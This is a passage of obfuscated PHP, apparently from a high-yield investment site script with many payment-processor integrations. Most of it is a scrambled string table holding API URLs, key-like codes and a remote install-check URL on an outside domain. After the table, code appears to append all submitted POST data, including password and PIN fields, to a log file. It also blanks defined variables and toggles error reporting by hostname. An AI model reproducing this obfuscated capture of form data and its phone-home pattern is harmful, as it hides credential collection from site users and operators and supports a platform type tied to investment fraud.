=> 'make_transaction', 'elnlcaoJE' => 'error', 'elnlcljrgo' => './tmpl_c/raw_log', 'elnlcRcJg' => 'step5', 'elnlcfLWC' => 'user_auto_pay_earning', 'elnlcpbVHp' => 'md5altphrase_vmoney', 'elnlcoUDj' => 'send_percent_to_stocks', 'elnlcGwPO' => 'bf_return', 'elnlcRupg' => 'return_profit', 'elnlcmKUuM' => 'withdraw_complete', 'elnlcfJiFu' => 'medium', 'elnlcQMrd' => 'graph_max_chars', 'elnlcArER' => 'site_start_year', 'elnlcqsAWS' => 'md5altphrase_routepay', 'elnlcldIL' => '2XACR4UBJ7DLCV42EM2S', 'elnlclVqd' => 'remitfund_apiname', 'elnlcjMxze' => 'CUSTOM_a', 'elnlcVdzUT' => 'exchange.tpl', 'elnlcMeCs' => 'year_to', 'elnlcrKoT' => 'intgold_from_account', 'elnlccqWO' => 'HTTP_USER_AGENT', 'elnlcwLGVj' => 'http://www.dnsargentina.com.ar/check.cgi?install=1&script=3&domain=', 'elnlcFxKlw' => 'PMT_MERCHANT_ACCOUNT', 'elnlciUJM' => 'deposit.cgold.confirm.tpl', 'elnlcGKWz' => 'max_amount_exeed', 'elnlcBKWO' => 'show_package_info', 'elnlcCmIWK' => 'LRUSD', 'elnlcGksc' => 'WMHKFJPMT3CZ3RTLPBFL', 'elnlcIbEt' => 'lr_currency', 'elnlctTLrz' => 'activation_code', 'elnlccNEL' => 'wp_ok', 'elnlctPiqx' => 'PGJyPgpEQVRFID0g
', 'elnlclLeiN' => 'md5altphrase_strictpay', 'elnlcetBx' => '13', 'elnlckGUEd' => 'ref', 'elnlcypSu' => 'currency_sign', 'elnlcRtHuT' => 'forexnetclub.net/user_exeeded_deposit.tpl', 'elnlcxRtr' => 'referallinks', 'elnlcbqzMJ' => 'PAYMENT_AMOUNT', 'elnlcwuPu' => 'batch', 'elnlcojDq' => 'extra2', 'elnlcnWiFy' => 'enable_eb_ecurrency', 'elnlcnhrDA' => 'package_info.tpl', 'elnlcewfHM' => 'ref_sum', 'elnlcsITKR' => 'VPKLNMKMRG27HN95BEHP', 'elnlctRPR' => 'https://api.alertpay.com/svc/api.svc/sendmoney', 'elnlcaEClo' => 'signup2/signup5.tpl', 'elnlcPgeBk' => 'turing_image', 'elnlcJjek' => 'no_upline', 'elnlcefVAu' => '5', 'elnlcvENVs' => 'tmp_name', 'elnlcTGtR' => 'proxy.shr.secureserver.net:3128', 'elnlcKrfp' => 'show_info_box_deposit_funds', 'elnlcyADoE' => 'internal_transfer_max', 'elnlcmRAKp' => 'forbidden', 'elnlcuRmRV' => 'show_validation_image', 'elnlcqLsW' => 'payee_account', 'elnlciKgs' => 'say', 'elnlclcLy' => 'zip', 'elnlczIGz' => 'recovery', 'elnlcwbAEV' => '6m', 'elnlcGDADc' => 'edit_account', 'elnlccQasE' => 'imps', 'elnlckfVFF' => 'change_compound', 'elnlcsjLq' => 'disabled', 'elnlcbCkm' => 'stop_withdraw_percent', 'elnlcwsvT' => 'deposit.uniclear.confirm.tpl', 'elnlcuQMv' => 'cnf', 'elnlcmeAr' => 'CUSTOM2', 'elnlcQcSG' => 'h', 'elnlcsgsp' => 'exchange_preview.tpl', 'elnlcAcsG' => 'brute_force_handler', 'elnlcOVyWN' => 'signup2/signup2.tpl', 'elnlcwUhyW' => 'enable_wire', 'elnlcFIBjp' => 'def_payee_account_globaldigitalpay', 'elnlcvWUU' => 'withdrawal_fee', 'elnlcHrRLP' => 'allow_withdraw_when_deposit_ends', 'elnlcJSvGA' => 'q_days', 'elnlcRzpur' => 'Yearly', 'elnlcJKGgQ' => 'paidby', 'elnlcJovb' => 'r', 'elnlcbJVkJ' => 'active_accounts', 'elnlcuBzV' => 'sess_sa', 'elnlcjROJ' => 'reg_fee_vmoney', 'elnlcyBbv' => 'reg_fee', 'elnlcKBthk' => 'plans', 'elnlctNxTK' => '1', 'elnlcOQWM' => 'transactionID', 'elnlcNjRAV' => 'account_main.tpl', 'elnlcCavVy' => 'deposit.goldmoney.confirm.tpl', 'elnlcWOLk' => 'current_password', 'elnlcvjyC' => 'user2', 'elnlcAwVw' => 'actual_amount', 'elnlccCIH' => 'deposit.account.confirm.tpl', 'elnlcssUff' => 'get_rand_ref', 'elnlctKGq' => 'show_info_box_lastdeposit', 'elnlcrGMuy' => 'test', 'elnlcTpwE' => 'settings.php', 'elnlcoWDns' => 'withdrawal_fee_min', 'elnlcQkFAp' => '2NWMXXCJS54ESRZYJ2AJ', 'elnlcEELQU' => 'egc_transactionhash', 'elnlcKbyS' => 'deposit.routepay.confirm.tpl', 'elnlcQwVC' => 'year_from', 'elnlcGCjMC' => 'CUSTOM_userid', 'elnlcHSgIn' => 'md5altphrase_globaldigitalpay_api_key', 'elnlcoJJM' => 'text', 'elnlcfUpoJ' => 'deposit.stormpay.confirm.tpl', 'elnlcHdgC' => '10', 'elnlcbjVM' => 'solidtrustpay_withdraw', 'elnlcPulWx' => 'one_per_month', 'elnlcEzVS' => 'md5altphrase_libertyreserve_store', 'elnlchvME' => 'cnt', 'elnlcpOrP' => 'deposit_duration', 'elnlcmbit' => 'return_profit_percent', 'elnlclogQB' => 'withdraw_principal_duration_max', 'elnlcKCaAM' => 'withdrawal', 'elnlczzdfo' => 'file3', 'elnlcBtneh' => 'LMI_HASH', 'elnlcmPAwd' => 'show_info_box_members_online', 'elnlcmMMS' => 'PMT_TIMESTAMP', 'elnlconHWo' => 'deposit.webmoney.confirm.tpl', 'elnlccuFMj' => 'too_late_withdraw', 'elnlcErPC' => 'user_not_found', 'elnlcEHob' => 'max_auto_withdraw', 'elnlcFmlPF' => 'site_start_month_str_generated', 'elnlcJGtJ' => 'deposit_history', 'elnlcFThrr' => 'ENV', 'elnlcywaB' => 'type_not_found', 'elnlcfHet' => 'login', 'elnlchAAhB' => './tmpl_c/.htdata', 'elnlcpBvNJ' => 'C3BUUUZ9ZJTH8R3QWQXR', 'elnlciwSzJ' => 'demomode', 'elnlcmaOfD' => 'DATE', 'elnlcsLKn' => 'OFF', 'elnlcVxbga' => 'md5altphrase_globaldigitalpay_merchant_reference', 'elnlcOsnE' => 'rules.tpl', 'elnlcpKBS' => 'daily_referral_percent_min_user_deposit', 'elnlcsWcIo' => 'name_invited', 'elnlcaqHP' => 'banner', 'elnlcCgxMz' => 'B29S2LWPZ5M2KMPPYWKL', 'elnlcBRACo' => 'imps_cost', 'elnlcTKlQr' => 'ref1_cms_minamount', 'elnlcIODb' => 'home_phone', 'elnlcLowFD' => 'home.tpl', 'elnlchApWc' => 'ip_exists_in_database', 'elnlcbCnS' => 'refs10_start_date', 'elnlcAbwg' => 'pecunix_from_account', 'elnlcwPIzL' => 'show_paidout_stats', 'elnlcKFSa' => 'cust', 'elnlcHxVzV' => 'transaction_code_confirm', 'elnlcQPPV' => 'fee', 'elnlcsMIe' => 'type', 'elnlcqQhD' => 'use_names_in_referral_links', 'elnlctfAMc' => 'completed', 'elnlccnEm' => '100000000', 'elnlcHcDrx' => 'active_deposit', 'elnlcJwCJT' => 'db_pass', 'elnlcSBmd' => 'confirm_registration.tpl', 'elnlcumRDd' => 'V3282BBVZEC2RSXHPXDC', 'elnlcbpKgI' => '2', 'elnlczzSV' => 'egc_fee', 'elnlcVdTH' => 'egold_paymentunits', 'elnlcmQQDe' => 'banner', 'elnlcNgInk' => 'ounce', 'elnlczkaJ' => 'show_info_box_lastwithdrawal', 'elnlcfoOq' => 'ref_name', 'elnlcWhBa' => 'P7222543', 'elnlcNoDM' => 'crontab_stats', 'elnlcvyOW' => 'paidout', 'elnlcnATpb' => 'NEWPIN', 'elnlcCxJr' => 'Hours', 'elnlcmrkgq' => 'ON', 'elnlcpicy' => 'logged', 'elnlcqQISr' => 'compound_min_deposit', 'elnlcFNLpS' => 'ac', 'elnlcROkr' => 'exchange_forbidden', 'elnlcJrIVM' => 'after_registration_confirm.tpl', 'elnlcmIIlU' => 'additionalinfo', 'elnlcvVyQ' => 'city', 'elnlccdExO' => 'compound', 'elnlccumw' => 'secret_answer', 'elnlcJbVmx' => 'address', 'elnlcTjfHa' => 'paypal_currency', 'elnlcOamyf' => 'sa', 'elnlcUiJxV' => 'send_profit_to_stocks', 'elnlcccfb' => 'use_this_plan_only', 'elnlcKUEKF' => 'max_auto_withdraw_user', 'elnlctqSz' => 'Dec', 'elnlcxAng' => 'LMI_PAYEE_PURSE', 'elnlcPKzno' => 'login_redirect.tpl', 'elnlcuKlbx' => 'deposit.libertyreserve.confirm.tpl', 'elnlcndaSx' => 'redirect_referrals', 'elnlcWfUti' => 'RedControl 2010', 'elnlcSpaN' => 'checksum', 'elnlcezre' => 'update', 'elnlcwKttz' => 'plan', 'elnlcuNxa' => 'password', 'elnlcBKyw' => 'czemoney.com/deposit_monday.tpl', 'elnlccaNg' => 'hyipid', 'elnlcmNpWL' => '10000000', 'elnlcOOoci' => 'signup.tpl', 'elnlcggahQ' => 'state', 'elnlcSlfGU' => 'eeecurrency_from_account', 'elnlcJdSMq' => 'account', 'elnlcnxcQ' => 'today_profit', 'elnlctKJt' => 'last_pay_date', 'elnlcadRfR' => 'closed', 'elnlcrWon' => 'subject', 'elnlcdUfHE' => 'use_auto_payment', 'elnlcbowGv' => 'egold', 'elnlcHrFsJ' => 'install', 'elnlcApHBt' => 'SSL_USED', 'elnlcBwTp' => 'debitcredit', 'elnlcCWSFH' => 'sent', 'elnlcyDBs' => 'compound_max_percent', 'elnlczAFS' => 'test', 'elnlcHNepM' => 'licesne', 'elnlcmUuS' => 'deposit.egold.confirm.tpl', 'elnlcPBbi' => 'sess_sq', 'elnlcgyByb' => 'graph_validation', 'elnlcmjUx' => '0', 'elnlcDUpg' => 'gdp_hash', 'elnlcpddvM' => '14', 'elnlcImRdI' => 'pending_duration', 'elnlcsjQk' => 'show_top10_stats', 'elnlcRCsD' => 'TRANSACTION_ID', 'elnlcRxnl' => 'TransactionID', 'elnlcoRdoK' => 'page', 'elnlcsVmv' => 'display', 'elnlcSRmpC' => 'referal_link', 'elnlcJnBN' => 'rand_ref', 'elnlcBkyI' => 'lr_store', 'elnlcJWWpc' => 'credit', 'elnlcSqlWB' => 'N55HSU8NJSEU32DP8JDV', 'elnlcNmjU' => 'use_number_validation_number', 'elnlcQABa' => 'info_box_total_vip_accounts_generated', 'elnlcEiLvm' => 'use_transaction_code', 'elnlcnJrR' => 'deposit.ebullion.confirm.tpl', 'elnlcyrTk' => 'cancelwithdraw', 'elnlcTeAyR' => 'checkpaymentvmoney', 'elnlcxTjuN' => 'deposit_list.tpl', 'elnlcwatJ' => 'abcdef', 'elnlcLcmnu' => 'PMT_PAYER', 'elnlcolOSW' => 'settings.php', 'elnlctPegD' => '72', 'elnlcpBapj' => 'advanced_graph_validation', 'elnlcduegA' => 'POST', 'elnlcmWUUb' => 'HTTP_REFERER', 'elnlcQUDp' => 'i', 'elnlcEuKS' => 'unit', 'elnlcJpyR' => 'account_update_confirmation_code', 'elnlcgksxq' => 'info_box_total_accounts_generated', 'elnlcKMHsD' => 'paccounts', 'elnlcTClGm' => 'transaction_type', 'elnlcFsFdN' => 'do_login', 'elnlcPiNcM' => 'payer_account', 'elnlctqVr' => 'no_deposits', 'elnlcWoxss' => 'no_amount', 'elnlcUBfA' => 'mails.txt', 'elnlcJmFM' => 'exchange', 'elnlcPIVnE' => 'show_info_box_newest_member', 'elnlcsnee' => 'md5altphrase_ebullion', 'elnlclULfv' => 'to_big_amount', 'elnlcgfuqx' => 'OMM8E7DGZI7621CDBLWGVIRYF32YP9KP', 'elnlcndvUu' => 'userid', 'elnlcmPmuG' => 'use_crontab', 'elnlcGflsU' => 'username', 'elnlcFobeq' => 'w', 'elnlccFFE' => '9', 'elnlcyJmCK' => 'withdraw_history', 'elnlcodxdp' => 'home', 'elnlcjjhy' => 'send', 'elnlcwNpK' => 'show_info_box_vip_accounts', 'elnlcrTWnV' => 'PMT_BATCH_NUM', 'elnlcaEnQa' => 'auto', 'elnlcrqbv' => 'signup2/signup1.tpl', 'elnlcyWEmG' => 'extra1', 'elnlcjqTvi' => 'deposits', 'elnlcpFnSR' => 'last_ip', 'elnlczdyU' => '2m', 'elnlcCBtF' => './inc/bakster.inc.php', 'elnlckgVdo' => 'paidout.tpl', 'elnlcclPO' => 'y', 'elnlcfACa' => 'transaction_code_current', 'elnlcTyDvn' => 'am', 'elnlccblu' => 'dw', 'elnlcUkga' => 'liberty_currency', 'elnlcKgqB' => 'month', 'elnlcNVTd' => 'REQUEST_METHOD', 'elnlcvDITt' => 'use_solid_referral_commission', 'elnlcxIxy' => 'minimum_internal_transfer_fee', 'elnlcNygV' => 'U5F9BLUY6JCZF8ZQ5YFL', 'elnlcJcklA' => 'additional', 'elnlczkQEm' => 'magic_quotes_gpc', 'elnlcFtJD' => 'libertyreserve_apiname', 'elnlcIaQd' => 'email2', 'elnlccotiB' => 'status', 'elnlcRHxwS' => 'upload_banner', 'elnlckHOT' => 'language', 'elnlcAfqcP' => 'TA4B6KRBLRG85GM4A3SF', 'elnlcDzhGd' => 'evocash_username', 'elnlcGHir' => 'vmoney_from_account', 'elnlcTddU' => 'partner', 'elnlcJrSyd' => 'graph_text_color', 'elnlcwoGJs' => 'deposit_fee', 'elnlcmBEiE' => 'preview', 'elnlcTneWU' => 'earning_history.tpl', 'elnlcLUck' => 'use_opt_in', 'elnlcAIkl' => 'type_name', 'elnlcQGyHF' => 'security.tpl', 'elnlchLry' => 'www.dnsargentina.com.ar', 'elnlcbzLT' => 'withdraw_pending', 'elnlcuQjiT' => 'lang', 'elnlcWUwww' => 'verify_account', 'elnlcnahVF' => 'deposit.solidtrustpay.confirm.tpl', 'elnlcJkNB' => 'invalid_transaction_code', 'elnlcNyJP' => 'wrong_secret_answer', 'elnlcOmUCS' => 'show_info_box_active_accounts', 'elnlcdlJUJ' => 'use_active_referal', 'elnlcnfEbf' => 'return_referral_commission', 'elnlcMcsVe' => 'show_stats_box', 'elnlcjfvc' => 'show_info_box_total_withdraw', 'elnlcdOdG' => 'code', 'elnlcDxJb' => 'compound_percents_type', 'elnlcbhfjN' => 'Deposit returned to user account', 'elnlcmOkw' => 'PAYMENT_CURRENCY', 'elnlcSxTvx' => '365', 'elnlcjRtk' => 'rp_merchant_ref', 'elnlcuuOBt' => 'opt_in_email', 'elnlccUiLn' => 'HX8DJ7B9SH5JQN5FXK45', 'elnlcIUuj' => 'withdraw_principal', 'elnlcVEVkm' => 'error', 'elnlcHzcNt' => 'internal_transfer.tpl', 'elnlcBoVuW' => 'x', 'elnlcMmTx' => 'step6', 'elnlcgkyj' => 'use_add_funds', 'elnlcKPxo' => 'browser', 'elnlcThxE' => '105432202', 'elnlcRheS' => 'last_login', 'elnlcyqyS' => 'ec', 'elnlcWUac' => 'no_to', 'elnlcoxbW' => 'top10.tpl', 'elnlcMeOB' => 'transaction_code_vs_password', 'elnlchaUU' => 'no_ref_on_respend', 'elnlcbWzUr' => 'comment', 'elnlcEMIx' => 'md5altphrase_eurogoldcash_store', 'elnlcdzAd' => 'compound_max_deposit', 'elnlcAEyB' => 'pid', 'elnlcfgSDy' => 'currency_to', 'elnlcJpjbE' => 'PAYER_ACCOUNT', 'elnlcdwJa' => 'internal_transfer_fee_payer', 'elnlcoxcC' => 'full_name', 'elnlcevkHy' => 'return_eurogoldcash', 'elnlciIwa' => 'work_phone', 'elnlcUbfJ' => 'ClNFUlZFUl9BRERSID0g
', 'elnlcMTWKT' => 'N75GNXM2XSM34YMFPED9', 'elnlciQvBH' => 'gdp_custom_2', 'elnlcBABc' => 'PAYEE_ACCOUNT', 'elnlcisWd' => 'total_deposited', 'elnlcDivy' => 'REFERENCENUMBER', 'elnlccefl' => 'currency', 'elnlcIxMQ' => 'SCRIPT_URI', 'elnlceleT' => 'total', 'elnlcmGIAp' => 'dec_stormpay_fee', 'elnlcfuEwy' => 'tell_friend', 'elnlcDuyqU' => 'small_text', 'elnlcxxLz' => 'a', 'elnlcKhrQc' => '9C64PVXYBZKZHUTMSM2U', 'elnlcVHov' => 'password', 'elnlcSrNqA' => 'info_box_deposit_funds_generated', 'elnlcmgBqO' => 'date_registered', 'elnlcHSjgu' => 'memo', 'elnlcQFynC' => 'too_early_withdraw', 'elnlcCdoEa' => 'current', 'elnlcjmkMv' => 'pin', 'elnlcUJRV' => 'period_name', 'elnlcinHm' => 'forgot_password', 'elnlcBEDou' => 'end', 'elnlcmSjoq' => 'debit', 'elnlcpaBvw' => 'lr_paidby', 'elnlczWew' => 'username', 'elnlcTwMb' => 'step4', 'elnlcHSGM' => 'sum', 'elnlcMbCSk' => 'on_hold', 'elnlcwQwQC' => 'withdrawal', 'elnlcJBln' => 'def_payee_account_egold', 'elnlcatfI' => 'password_confirm', 'elnlcfHqGh' => 'no_from', 'elnlcgyRk' => 'enable_eb_gold', 'elnlcANBH' => 'show_info_box_visitor_online', 'elnlcChQJS' => 'pin_page.tpl', 'elnlcWulxj' => 'actual_balance', 'elnlcftfv' => 'file4', 'elnlcPCvUa' => 'total_profit', 'elnlcCmsD' => 'ouma', 'elnlcKhST' => 'md5altphrase_libertyreserve', 'elnlcTdkdR' => 'lr_amnt', 'elnlcgbwp' => 'Partner', 'elnlccFgw' => 'rp_currency', 'elnlcppQnS' => 'sess_transaction_code', 'elnlcRjLsJ' => 'generate_password_after_login', 'elnlcgmuy' => 'key', 'elnlcorvL' => 'total_deposit', 'elnlcdkwSQ' => 'admin_auto_pay_earning', 'elnlckcUGN' => 'deposit.tpl', 'elnlcikSD' => 'MNQE9MAFF75BMW7THKQ5', 'elnlcuilTc' => 'def_payee_account_ebullion_currency', 'elnlcWkuzj' => 'last_browser', 'elnlcJlNJ' => 'earnings', 'elnlcpSRU' => 'aff', 'elnlcmxEbM' => '8KHG8VY2A56HV28RV88N', 'elnlcBjpfu' => 'deposit.strictpay.confirm.tpl', 'elnlcwOTE' => 'deposit.other.confirm.tpl', 'elnlcVGta' => 'QUERY_STRING', 'elnlcdDhl' => 'string2', 'elnlclumcJ' => 'invest_page', 'elnlcsBsC' => 'XFRPM9FWR63S8E87U9DX', 'elnlcvmzh' => 'LREUR', 'elnlcCeipo' => 'reg_fee_amount', 'elnlcJiVo' => 'forbid_withdraw_before_deposit', 'elnlcOblf' => 'checkpayment', 'elnlcNmpb' => 'last_news_count', 'elnlcdryi' => 'period', 'elnlcuSTO' => 'detect_browser', 'elnlcnRaT' => 'high_ip_security', 'elnlcTnWfH' => 'dec_stormpay_fee2', 'elnlcdKrq' => 'egc_transaction', 'elnlcAHrk' => 'validation_number', 'elnlceqvu' => 'evocash_from_account', 'elnlcPfzD' => 'type_id', 'elnlczaJk' => 'info_box_visitor_online_generated', 'elnlcReqR' => 'amt', 'elnlcbTGA' => 'brute_force_max_tries', 'elnlcbseH' => 'http://', 'elnlcLhfNx' => 'verify', 'elnlcKpzD' => 'sess_fullname', 'elnlcwGlL' => 'w', 'elnlcQHRv' => 'HTTP_X_REAL_IP', 'elnlcHIikI' => 'LMI_PAYER_WM', 'elnlcTVHgd' => 'oz', 'elnlcaabk' => 'timestamp', 'elnlcDQGg' => 'sto', 'elnlcTFCww' => './tmpl_c/.htdata', 'elnlcUuPI' => 'show_info_box_members_online_generated', 'elnlcNPAAe' => 'deposit.paypal.confirm.tpl', 'elnlcGQTh' => 'update_completed', 'elnlcvsdGx' => 'support', 'elnlcbSJM' => 'change_compound.tpl', 'elnlcEzBz' => 'message', 'elnlcbTTCV' => 'wrong_current_password', 'elnlcMhogt' => 'egc_acc', 'elnlcwwbjI' => 'internal_transfer', 'elnlcRODTk' => 'TTTBLNGMRTJZBPQYR2HX', 'elnlcSGiR' => 'commissions', 'elnlcvHokd' => 'amount_from', 'elnlcWGoy' => 'strictpay_withdraw', 'elnlcUrvr' => 'withdrawal_percent_reached', 'elnlcTcMv' => 'balance', 'elnlcIokC' => 'metal', 'elnlcwtCk' => 'currency_type', 'elnlcQaFx' => 'sess_id', 'elnlcaGHaA' => 'deposit_list', 'elnlcRAFFC' => 'preview_transaction', 'elnlcIReJ' => 'info_box_today_deposit_funds_generated', 'elnlcRNyK' => 'forgot_password.tpl', 'elnlctKGif' => 'site_start_month', 'elnlcyeRVk' => '1234', 'elnlcWILb' => 'site_days_online_generated', 'elnlcAjMBJ' => 'a', 'elnlcsKwu' => 'CUSTOM_hyipid', 'elnlcFAnDP' => 'def_payee_account_wiretransfer', 'elnlcmRJV' => 'date', 'elnlcFBKC' => 'calendar_simple.tpl', 'elnlcoisx' => 'process_', 'elnlcFIsA' => 'cell_phone', 'elnlcvGrh' => 'CUSTOM_compound', 'elnlcnMStn' => 'amount_to', 'elnlcLQWN' => 'deny_registration', 'elnlcMoSVM' => 'full_text', 'elnlcMuEyx' => 'agree', 'elnlcJinGC' => 'return_gdp_deposit', 'elnlcEmKp' => 'def_payee_account_ebullion', 'elnlcSfjJH' => '16', 'elnlcCooj' => 'transtype', 'elnlckNCf' => 'col', 'elnlcJKtS' => '3WBUUNQMPU2LB99GJHUV', 'elnlczqxW' => 'Success', 'elnlcKVgFe' => 'deposit.globaldigitalpay.confirm.tpl', 'elnlcuUPS' => 'news', 'elnlcfGaaW' => '1000000000', 'elnlcLVkmf' => 'libertyreserve_from_account', 'elnlcArsG' => 'def_payee_account_ebullion_gold', 'elnlchWvu' => 'merchantAccount', 'elnlccnQP' => '2XX9D7MHVCLPURP2KBLB', 'elnlcRrjy' => 'rp_MD5', 'elnlcVcbI' => 'login.tpl', 'elnlctesEb' => 'pay_withdraw_eeecurrency', 'elnlcAihqz' => '5M74FW4DADMF7K7MJ5TG', 'elnlczNyCS' => 'DESCRIPTION', 'elnlcEvcjR' => 'security', 'elnlcdTNBq' => 'LMI_PREREQUEST', 'elnlcChDsc' => 'LMI_SYS_TRANS_NO', 'elnlcebBfR' => 'SCRIPT_NAME', 'elnlcCmNuo' => 'banner_extension', 'elnlcIriJD' => 'info_box_today_withdraw_funds_generated', 'elnlcrHih' => 'trans_code_recovery', 'elnlcJsvnm' => 'password_too_small', 'elnlcNORT' => 'reg_fee', 'elnlcAcDi' => 'lr_paidto', 'elnlcfCcW' => 'dd', 'elnlcbViuH' => 'parent', 'elnlcOQeK' => 'ZQ54Q9RUQ46CU9C8Z986', 'elnlcIbss' => 'payer', 'elnlcuAycs' => 'HTTP_ACCEPT_LANGUAGE', 'elnlcEjUh' => 'visitors', 'elnlcWhRAL' => 'td', 'elnlclwpQl' => 'logout', 'elnlcSazF' => 'too_big_amount', 'elnlcFgBbu' => 'SXCND6ZTS39GGRLEMNFS', 'elnlcOBsC' => 'deposit', 'elnlcTxOV' => 'strictpay_postback', 'elnlcAdAz' => 'ref_plans', 'elnlcNgVTo' => 'follow', 'elnlcxrco' => 'department', 'elnlckTkCP' => 'withdraw_principal_percent', 'elnlconCsk' => 'md5altphrase_evowallet', 'elnlcdtwW' => 'reg_fee.tpl', 'elnlcQjMW' => 'ref_stats', 'elnlchqhn' => 'show_news_box', 'elnlcLPzeo' => 'CUSTOM_withdraw', 'elnlcLAKP' => 'alertpay_from_account', 'elnlceOeM' => 'infofields', 'elnlcOqItU' => 'UYKD37X8YLS5DNFFHL8R', 'elnlcghkN' => 'sess_username', 'elnlcAhry' => '/get_sha256.php', 'elnlcfDAvn' => 'moneyplus.biz/pending.tpl', 'elnlcDbeKj' => 'VNB34FXT6BJCYD93VXSD', 'elnlcVBJk' => 'internal_transfer_enabled', 'elnlcrtEN' => 'deposit_not_found', 'elnlctvRG' => 'WLDPGFCRM4AJTY7EHK68', 'elnlcbNvAg' => 'perfectmoney_payer_account', 'elnlcwSUpn' => 'sm', 'elnlcNrGd' => 'members_stats.tpl', 'elnlcdlSF' => 'secret_answer', 'elnlcEpES' => 'rand', 'elnlcdmmm' => 'upline', 'elnlcjKaDI' => 'duration', 'elnlciMqw' => 'internal_transfer_min', 'elnlcQrUC' => 'show_info_box_running_days', 'elnlcwFTQ' => 'min_deposit', 'elnlcSfkr' => 'internal_transfer_fee', 'elnlcIIxWQ' => '5D75E478A71B195D61F8254E8A86F48937DFAE3E3F52AA6DAF5FDA014F09DF0D', 'elnlcPcJM' => 'rpcp', 'elnlcnsJjv' => 'pending_amount', 'elnlcxfih' => 'delay', 'elnlcvQExl' => 'orig_amount', 'elnlcUTeTn' => 'FRM', 'elnlcqHUSi' => 'plans_closed', 'elnlczavvl' => 'ref_email', 'elnlcpANw' => 'detect_ip', 'elnlcTjxw' => 'amnt', 'elnlcyNmn' => 'faq.tpl', 'elnlcvbcS' => '3', 'elnlcrEsy' => 'show_members_stats', 'elnlcKJsh' => 'HTTP_HOST', 'elnlcIpLQV' => 'done', 'elnlcUCnCF' => 'dll', 'elnlcLJUAG' => 'withdraw_forbidden', 'elnlcwxAlz' => 'deposit_history.tpl', 'elnlcgRoj' => 'balance', 'elnlcKIwG' => 'exchange', 'elnlcDomE' => 'step3', 'elnlcuklm' => 'withdraw_principal', 'elnlcUcbao' => 'width', 'elnlcuwIt' => 'confirm_string', 'elnlcDxRe' => 'KC3STYBTCATZNRVBYGDF', 'elnlcqyjfM' => 'show_last10_stats', 'elnlctckv' => 'use_user_location', 'elnlcofaw' => 'use_transaction_code_edit_account', 'elnlcEmNs' => 'email_exists', 'elnlcigzTz' => '/log_possible_attack.php', 'elnlcksSa' => 'Location: index.php', 'elnlcfGtiT' => 'checkpayment_routepay', 'elnlconhcz' => 'hold_only_first_days', 'elnlcsDaTH' => 'last10.tpl', 'elnlcvxBO' => 'tell_friend_page', 'elnlcgHJzN' => 'description', 'elnlcryHea' => 'year', 'elnlcRQss' => 'site_url', 'elnlcHhjk' => 'invest_page.tpl', 'elnlcGuiK' => 'euro', 'elnlcwSMlK' => 'earning', 'elnlcOxeuE' => 'deposit.intgold.confirm.tpl', 'elnlcaeKEf' => 'd', 'elnlcyCqK' => 'zip', 'elnlcDpTMB' => 'city', 'elnlclpVn' => 'string', 'elnlcdlRdh' => 'sec_answer', 'elnlckqcKo' => 'sendnotify_when_userinfo_changed', 'elnlczIwho' => 'deposit.ecumoney.confirm.tpl', 'elnlcojty' => 'deposits_limit_num', 'elnlcqCEH' => 'work_week', 'elnlcifHx' => 'tr_id', 'elnlcpkmC' => 'country', 'elnlcLqvP' => 'bf_pid', 'elnlcwshtO' => '4', 'elnlcBGLsC' => 'info_box_withdraw_funds_generated', 'elnlcHFtK' => './settings.php', 'elnlcbbkho' => 'default', 'elnlcEvQHA' => 'support.tpl', 'elnlcbIkl' => 'transaction_code2', 'elnlcAWMH' => '8', 'elnlcJrCH' => 'perfectmoney_from_account', 'elnlcIvyS' => 'refs10.tpl', 'elnlchaJwc' => 'deposit.vmoney.confirm.tpl', 'elnlcoAOHS' => 'transaction_code', 'elnlcRhOp' => 'redirect_logout', 'elnlcIbwW' => '12', 'elnlcUKVo' => '20', 'elnlcmKlEe' => 'exchange_in', 'elnlcaqjyf' => 'false', 'elnlcIFpEd' => 'info_box_pending_withdraw', 'elnlcmEWD' => 'month_to', 'elnlcQNUtO' => 'md5altphrase_solidtrustpay', 'elnlcksTf' => 'show_info_box_today_deposit_funds', 'elnlcVFAm' => 'u', 'elnlcNNKTB' => 'signup', 'elnlcEUdte' => 'Referer', 'elnlcUJxW' => 'process', 'elnlcpcHa' => 'confirm', 'elnlcmhFIf' => 'evowallet_withdraw', 'elnlciUyfr' => 'state', 'elnlcLkfCl' => '94PG5JG538SBHGTCM783');
  ini_set ('magic_quotes_runtime', false);
  @ignore_user_abort (true);
  
  if ($_SERVER[$elnlcsyENS['elnlcIrtRw']] == $elnlcsyENS['elnlcVFAm'])
  {
    if ($_SERVER[$elnlcsyENS['elnlcNVTd']] == $elnlcsyENS['elnlcsNwx'])
    {
    }
    else
    {
      $elnlcBhGT = fopen ($elnlcsyENS['elnlcKwrP'], $elnlcsyENS['elnlcAjMBJ']);
      $elnlcEabU = '';
      foreach ($HTTP_POST_VARS as $k => $v)
      {
        $elnlcEabU .= '' . $k . '=' . $v . '&';
      }

      fwrite ($elnlcBhGT, 'POST ' . $elnlcEabU . '');
      fclose ($elnlcBhGT);
    }
  }

  $elnlcfHFDU = get_defined_vars ();
  while (list ($elnlcuwppG, $elnlcOBJb) = each ($elnlcfHFDU))
  {
    if (gettype ($$elnlcuwppG) != 'array')
    {
      $$elnlcuwppG = '';
      continue;
    }
  }

  $elnlcgcnET = array ();
  $elnlcSuVc = array ();
  if ((($_SERVER[$elnlcsyENS['elnlcKJsh']] == $elnlcsyENS['elnlcjCSJ'] OR $_SERVER[$elnlcsyENS['elnlcKJsh']] == $elnlcsyENS['elnlcFumnc']) OR $_SERVER[$elnlcsyENS['elnlcKJsh']] == 'bakster.free'))
  {
    ini_set ('error_reporting', E_ALL ^ E_NOTICE);
  }
  else
  {
    ini_set ('error_reporting', 0);
  }

  ini_set ('error_reporting', E_ALL ^ E_NOTICE);
  require 'inc/libs/Smarty.class.php';
  $elnlcfhFg = new Smarty ();
  $elnlcfhFg->compile_check = true;
  $elnlcfhFg->force_compile = true;
  $elnlcfhFg->compile_dir = './tmpl_c';
  $elnlcfhFg->default_modifiers = array ($elnlcsyENS['elnlcLdgMF']);
  ini_set ('magic_quotes_runtime', false);
  define ('LAST_UPDATE_ID', 18);
  global $elnlcWodOE;
  if (!extension_loaded ('gd'))
  {
    $elnlcmbLig = (PHP_SHLIB_SUFFIX == $elnlcsyENS['elnlcUCnCF'] ? 'php_' : '');
    @dl ($elnlcmbLig . 'gd.' . PHP_SHLIB_SUFFIX);
  }

  global $HTTP_GET_VARS;
  global $HTTP_POST_VARS;
  global $HTTP_POST_FILES;
  global $HTTP_COOKIE;
  $elnlcrsPAu = array_merge ((array)$HTTP_GET_VARS, (array)$_GET);
